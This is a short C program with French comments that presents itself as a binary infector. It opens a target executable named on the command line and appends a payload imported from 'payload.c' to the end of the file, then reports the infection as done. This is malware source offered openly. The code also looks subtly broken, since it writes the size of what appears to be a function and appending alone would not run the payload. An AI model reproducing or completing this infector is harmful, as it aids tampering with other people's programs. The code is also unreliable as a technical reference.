#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "payload.c"

void infect_binary(const char *binary) {
    // Ouvrir le binaire cible
    FILE *file = fopen(binary, "rb+");
    if (!file) {
        perror("Erreur d'ouverture");
        return;
    }

    // Injecter le payload (simple append dans cet exemple)
    fseek(file, 0, SEEK_END);
    fwrite(run_payload, sizeof(run_payload), 1, file);
    fclose(file);

    printf("Infection terminée pour : %s\n", binary);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <binaire>\n", argv[0]);
        return 1;
    }
    infect_binary(argv[1]);
    return 0;
}
